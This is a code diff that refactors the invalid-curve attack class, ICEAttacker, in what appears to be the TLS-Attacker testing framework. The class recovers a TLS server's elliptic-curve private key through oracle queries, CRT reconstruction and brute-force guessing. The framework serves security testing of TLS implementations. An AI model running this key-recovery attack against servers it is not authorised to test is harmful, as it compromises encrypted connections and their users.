@@ -10,6 +10,10 @@ package de.rub.nds.tlsattacker.attacks.ec;
 
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.tlsattacker.attacks.ec.oracles.ECOracle;
+import de.rub.nds.tlsattacker.core.constants.NamedGroup;
+import de.rub.nds.tlsattacker.core.crypto.ec_.CurveFactory;
+import de.rub.nds.tlsattacker.core.crypto.ec_.EllipticCurve;
+import de.rub.nds.tlsattacker.core.crypto.ec_.Point;
 import de.rub.nds.tlsattacker.util.MathHelper;
 import java.math.BigInteger;
 import java.util.Arrays;
@@ -37,61 +41,46 @@ public class ICEAttacker {
 
     private final ECOracle oracle;
 
-    private final ECComputer computer;
+    private final NamedGroup group;
 
-    private BigInteger result;
-
-    /**
-     *
-     * @param oracle
-     */
-    public ICEAttacker(ECOracle oracle) {
-        this(oracle, ServerType.NORMAL);
-    }
-
-    /**
-     *
-     * @param oracle
-     * @param server
-     */
-    public ICEAttacker(ECOracle oracle, ServerType server) {
-        this(oracle, server, 0);
-    }
+    private final EllipticCurve curve;
 
     /**
      *
      * @param oracle
      * @param server
      * @param oracleAdditionalEquations
+     * @param group
      */
-    public ICEAttacker(ECOracle oracle, ServerType server, int oracleAdditionalEquations) {
+    public ICEAttacker(ECOracle oracle, ServerType server, int oracleAdditionalEquations, NamedGroup group) {
         this.oracle = oracle;
-        this.computer = new ECComputer();
-        this.computer.setCurve(oracle.getCurve());
         this.server = server;
         this.oracleAdditionalEquations = oracleAdditionalEquations;
+        this.group = group;
+        curve = CurveFactory.getCurve(group);
     }
 
     /**
      *
+     * @return
      */
-    public void attack() {
+    public BigInteger attack() {
+        BigInteger result = null;
         long currentTime = System.currentTimeMillis();
         switch (server) {
             case NORMAL:
-                attackNormal();
+                result = attackNormal();
                 break;
             case ORACLE:
-                attackOracle();
+                result = attackOracle();
                 break;
         }
         LOGGER.info("Time needed for the attack: {} seconds", ((System.currentTimeMillis() - currentTime) / 1000));
+        return result;
     }
 
-    private void attackNormal() {
-        result = null;
-        String namedCurve = oracle.getCurve().getName();
-        List<ICEPoint> points = ICEPointReader.readPoints(namedCurve);
+    private BigInteger attackNormal() {
+        List<ICEPoint> points = ICEPointReader.readPoints(group);
         List<BigInteger> congs = new LinkedList<>();
         List<BigInteger> moduli = new LinkedList<>();
         for (ICEPoint point : points) {
@@ -105,7 +94,7 @@ public class ICEAttacker {
                 LOGGER.info("Using equation: x^2 =   " + squareCong + " mod " + point.getOrder());
 
                 BigInteger prodModuli = computeModuliProduct(moduli);
-                if (prodModuli.bitLength() > (computer.getCurve().getKeyBits() * 2)) {
+                if (prodModuli.bitLength() > (curve.getModulus().bitLength() * 2)) {
                     /**
                      * It is not necessary to test all the points. For a correct
                      * CRT computation it is just needed that the moduli product
@@ -121,15 +110,14 @@ public class ICEAttacker {
         }
 
         BigInteger sqrtResult = MathHelper.CRT(congs, moduli);
-        result = MathHelper.bigIntSqRootFloor(sqrtResult);
+        BigInteger result = MathHelper.bigIntSqRootFloor(sqrtResult);
         LOGGER.info("Result found: {}", result);
         LOGGER.info("Number of server queries: {}", oracle.getNumberOfQueries());
+        return result;
     }
 
-    private void attackOracle() {
-        result = null;
-        String namedCurve = oracle.getCurve().getName();
-        List<ICEPoint> points = ICEPointReader.readPoints(namedCurve);
+    private BigInteger attackOracle() {
+        List<ICEPoint> points = ICEPointReader.readPoints(group);
         List<BigInteger> congs = new LinkedList<>();
         List<BigInteger> moduli = new LinkedList<>();
         int additionalEquations = 0;
@@ -145,7 +133,7 @@ public class ICEAttacker {
                 LOGGER.info("Using equation: x^2 =   " + squareCong + " mod " + point.getOrder());
 
                 BigInteger prodModuli = computeModuliProduct(moduli);
-                if (prodModuli.bitLength() > (computer.getCurve().getKeyBits() * 2 + 4)) {
+                if (prodModuli.bitLength() > (curve.getModulus().bitLength() * 2 + 4)) {
                     /**
                      * It is not necessary to test all the points. For a correct
                      * CRT computation it is just needed that the moduli product
@@ -168,7 +156,8 @@ public class ICEAttacker {
         BigInteger[] congsArray = ArrayConverter.convertListToArray(congs);
         BigInteger[] moduliArray = ArrayConverter.convertListToArray(moduli);
         int lastElementPointer = usedOracleEquations.length - 1;
-        bruteForceWithAdditionalOracleEquations(usedOracleEquations, congsArray, moduliArray, lastElementPointer);
+        BigInteger result = bruteForceWithAdditionalOracleEquations(usedOracleEquations, congsArray, moduliArray,
+                lastElementPointer);
 
         if (result != null) {
             LOGGER.info("Result found: {}", result);
@@ -176,6 +165,7 @@ public class ICEAttacker {
         } else {
             LOGGER.info("Unfortunately, no result found. Try to increase the number of additional equations.");
         }
+        return result;
     }
 
     /**
@@ -190,29 +180,30 @@ public class ICEAttacker {
      *            The modulis
      * @param pointer
      *            the pointer
+     * @return
      */
-    public void bruteForceWithAdditionalOracleEquations(int[] usedOracleEquations, BigInteger[] congs,
+    public BigInteger bruteForceWithAdditionalOracleEquations(int[] usedOracleEquations, BigInteger[] congs,
             BigInteger[] modulis, int pointer) {
-        if (result == null) {
-            int[] eq = Arrays.copyOf(usedOracleEquations, usedOracleEquations.length);
-            int maxValue = (pointer == usedOracleEquations.length - 1) ? (congs.length)
-                    : (usedOracleEquations[pointer + 1]);
-            int minValue = usedOracleEquations[pointer];
-            for (int i = minValue; i < maxValue; i++) {
-                eq[pointer] = i;
-                if (pointer > 0) {
-                    bruteForceWithAdditionalOracleEquations(eq, congs, modulis, (pointer - 1));
-                } else {
-                    LOGGER.debug("Trying the following combination: {}", Arrays.toString(eq));
-                    BigInteger sqrtResult = computeCRTFromCombination(usedOracleEquations, congs, modulis);
-                    BigInteger r = MathHelper.bigIntSqRootFloor(sqrtResult);
-                    LOGGER.info("Guessing the following result: {}", r);
-                    if (oracle.isFinalSolutionCorrect(r)) {
-                        result = r;
-                    }
+
+        int[] eq = Arrays.copyOf(usedOracleEquations, usedOracleEquations.length);
+        int maxValue = (pointer == usedOracleEquations.length - 1) ? (congs.length)
+                : (usedOracleEquations[pointer + 1]);
+        int minValue = usedOracleEquations[pointer];
+        for (int i = minValue; i < maxValue; i++) {
+            eq[pointer] = i;
+            if (pointer > 0) {
+                bruteForceWithAdditionalOracleEquations(eq, congs, modulis, (pointer - 1));
+            } else {
+                LOGGER.debug("Trying the following combination: {}", Arrays.toString(eq));
+                BigInteger sqrtResult = computeCRTFromCombination(usedOracleEquations, congs, modulis);
+                BigInteger r = MathHelper.bigIntSqRootFloor(sqrtResult);
+                LOGGER.info("Guessing the following result: {}", r);
+                if (oracle.isFinalSolutionCorrect(r)) {
+                    return r;
                 }
             }
         }
+        return null;
     }
 
     /**
@@ -256,25 +247,12 @@ public class ICEAttacker {
         // BigInteger secretModOrder = new BigInteger("240");
         for (int i = 1; i < point.getOrder(); i++) {
             secretModOrder = secretModOrder.add(BigInteger.ONE);
-            computer.setSecret(secretModOrder);
-            try {
-                Point guess = computer.mul(point);
-                if (oracle.checkSecretCorrectnes(point, guess.getX())) {
-                    return secretModOrder;
-                }
-            } catch (DivisionException ex) {
-
+            Point guess = curve.mult(secretModOrder, point);
+            if (oracle.checkSecretCorrectnes(point, guess.getX().getData())) {
+                return secretModOrder;
             }
         }
         return null;
-    }
-
-    /**
-     *
-     * @return
-     */
-    public BigInteger getResult() {
-        return result;
     }
 
     private BigInteger computeModuliProduct(List<BigInteger> moduli) {
@@ -294,7 +272,6 @@ public class ICEAttacker {
          *
          */
         NORMAL,
-
         /**
          *
          */
